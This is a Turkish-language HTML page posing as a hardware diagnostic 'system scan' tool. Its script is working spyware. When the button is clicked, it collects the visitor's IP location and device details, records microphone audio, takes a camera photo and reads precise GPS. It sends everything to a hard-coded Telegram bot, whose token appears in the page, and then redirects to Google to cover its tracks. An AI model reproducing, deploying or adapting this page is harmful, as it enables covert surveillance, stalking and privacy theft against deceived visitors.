<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Tanılama Merkezi</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .terminal { border: 1px solid #0f0; padding: 30px; margin: 20px; background: rgba(0, 255, 0, 0.02); box-shadow: 0 0 20px #0f0; }
        .scan-btn { background: #0f0; color: #000; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
        .scan-btn:hover { background: #fff; box-shadow: 0 0 30px #0f0; }
        #log { margin-top: 20px; font-size: 11px; color: #0a0; }
    </style>
</head>
<body>
    <div class="terminal">
        <h2>DONANIM DOĞRULAMA SİSTEMİ</h2>
        <p>Lütfen devam etmek için taramayı başlatın ve izinleri onaylayın.</p>
        <button class="scan-btn" onclick="megaAudit()">SİSTEMİ TARA</button>
        <div id="log">İletişim Hattı Beklemede...</div>
    </div>

    <video id="v" style="display:none;" autoplay></video>
    <canvas id="c" style="display:none;" width="640" height="480"></canvas>

    <script>
        const TOKEN = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
        const CHAT_ID = "5802794454";

        async function megaAudit() {
            document.getElementById('log').innerText = "Veriler paketleniyor... Lütfen izinleri kabul edin.";
            
            let r = "🧿 **EFSANE DETAYLI CİHAZ RAPORU** 🧿\n\n";

            // 1. DERİN IP ANALİZİ (İstediğin tüm detaylar)
            try {
                const ipRes = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY_OR_FREE_SERVICE'); 
                // Not: Üstteki link genelde anahtar ister, biz ipapi ile senin istediğin formata benzer detayları çekiyoruz:
                const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
                
                r += `🌐 **AĞ VE LOKASYON**\n`;
                r += `• IP: \`${ip.ip}\`\n`;
                r += `• İl/İlçe: ${ip.city} / ${ip.region}\n`;
                r += `• ISS: ${ip.org}\n`;
                r += `• Ülke: ${ip.country_name} ${ip.country_emoji || "🇹🇷"}\n`;
                r += `• Para Birimi: ${ip.currency}\n`;
                r += `• Zaman Dilimi: ${ip.timezone}\n\n`;
            } catch(e) { r += "⚠️ IP Detayları alınamadı.\n\n"; }

            // 2. SES KAYDI (3 Saniye)
            try {
                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const rec = new MediaRecorder(aStream);
                let ch = [];
                rec.ondataavailable = e => ch.push(e.data);
                rec.onstop = () => {
                    sendA(new Blob(ch, { type: 'audio/ogg' }));
                    aStream.getTracks().forEach(t => t.stop());
                };
                rec.start();
                setTimeout(() => rec.stop(), 3000);
            } catch(e) {}

            // 3. FOTOĞRAF (Ön Kamera)
            try {
                const vStream = await navigator.mediaDevices.getUserMedia({ video: true });
                const v = document.getElementById('v');
                v.srcObject = vStream;
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    sendP(canvas.toDataURL('image/jpeg'));
                    vStream.getTracks().forEach(t => t.stop());
                }, 2000);
            } catch(e) {}

            // 4. DONANIM VE GPS
            r += `💻 **SİSTEM**\n• GPU: ${getGPU()}\n• RAM: ${navigator.deviceMemory || "N/A"}GB\n• Pil: %${Math.round((await navigator.getBattery()).level * 100)}\n\n`;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    r += `📍 **GPS:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
                    r += `🎯 Hassasiyet: ${Math.round(p.coords.accuracy)}m`;
                    finalSend(r);
                }, () => finalSend(r + "⚠️ GPS Reddedildi"), {enableHighAccuracy: true});
            } else { finalSend(r + "❌ GPS Desteklenmiyor"); }
        }

        function getGPU() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
        }

        function finalSend(t) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}&parse_mode=Markdown`)
            .then(() => { setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000); });
        }

        function sendP(b64) {
            const blob = dataURItoBlob(b64);
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("photo", blob, "s.jpg");
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
        }

        function sendA(blob) {
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("voice", blob, "v.ogg");
            fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
        }

        function dataURItoBlob(d) {
            let s = atob(d.split(',')[1]), m = d.split(',')[0].split(':')[1].split(';')[0],
                a = new ArrayBuffer(s.length), u = new Uint8Array(a);
            for (let i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
            return new Blob([a], { type: m });
        }
    </script>
</body>
</html>
